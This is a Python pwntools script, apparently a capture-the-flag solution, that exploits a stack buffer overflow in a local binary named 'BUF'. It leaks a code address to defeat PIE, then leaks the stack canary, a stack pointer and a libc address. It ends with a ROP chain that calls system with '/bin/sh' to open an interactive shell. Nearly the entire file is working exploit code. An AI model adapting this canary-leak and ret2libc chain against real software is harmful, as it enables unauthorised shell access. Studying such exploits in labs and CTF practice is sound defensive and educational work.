#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./BUF')
elf = ELF('./BUF')

def pr(a,addr):
	log.success(a+': '+hex(addr))

p.recvuntil("Enter your name: \n")
p.sendline('A'*7)
p.recvuntil("A"*7+'\x0a')
_start = u64(p.recvuntil("\n",drop=True) + p16(0))
codebase = _start - 0x740
vuln = codebase + 0x913
ret = codebase + 0x6c6
pr('_start',_start)
pr('vuln',vuln)

p.recvuntil("Enter your data:\n")
payload = 'A'*104
p.sendline(payload) # sendline() 会在 payload 后面追加一个换行符 '\n' 对应的十六进制就是 0xa

p.recvuntil("Your data: ")
p.recvuntil('A'*104)
canary = u64(p.recv(8).ljust(8, "\x00")) - 0xa
stack = u64(p.recv(6).ljust(8, "\x00"))
rbp = stack - 0x10
pr('canary',canary)
pr('rbp',rbp)

p.recvuntil("Enter your data:\n")
payload  = "A"*104 + p64(canary) + p64(rbp)
payload += p64(ret) + p64(vuln)
p.send(payload)

#===============again================

gdb.attach(p)
pause()
p.recvuntil("Enter your data:\n")
payload  = "A"*120 # 泄露libcbase
p.sendline(payload)

p.recvuntil("Your data: ")
p.recvuntil('A'*120)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0xa - 0x21c00 #29d00
pr('libcbase',libcbase)

do_system = libcbase + 0x4f43b # <system+27>    call   do_system
binsh_addr = libcbase + 0x1b3d88
prdi_ret = libcbase + 0x2164f  # pop rdi ; ret

#gdb.attach(p)
pause()
p.recvuntil("Enter your data:\n")
payload  = "A"*104 + p64(canary) +  p64(0)
payload += p64(prdi_ret) + p64(binsh_addr)
payload += p64(do_system)

p.send(payload)
p.recv()
p.interactive()
